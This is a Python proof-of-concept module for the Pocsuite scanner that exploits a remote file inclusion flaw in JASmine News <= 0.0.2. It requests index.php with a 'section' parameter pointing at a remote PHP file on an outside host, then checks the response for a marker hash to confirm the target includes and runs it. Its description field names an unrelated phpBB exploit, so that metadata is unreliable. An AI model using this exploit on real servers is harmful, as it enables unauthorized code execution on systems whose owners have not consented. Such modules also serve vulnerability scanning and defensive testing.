#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class JASmine_News_Remote_File_Include(POCBase):
    vulID = '64073'
    version = '1'
    vulDate = '2006-10-17'
    author = ' '
    createDate = '2015-12-16'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-64073']
    name = 'JASmine <= 0.0.2 (index.php) Remote File Include Vulnerability'
    appPowerLink = 'http://www.sourcefiles.org/Utilities/Printer/Jasmine-Web-0.0.2.tar.bz2'
    appName = 'JASmine'
    appVersion = '<= 0.0.2'
    vulType = 'Remote File Inclusion'
    desc = 'phpBB PlusXL <= 2.0_272 (constants.php) Remote File Include Exploit'
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/index.php?section=http://tool.scanv.com/wsl/php_verify.txt?' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url


        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(JASmine_News_Remote_File_Include)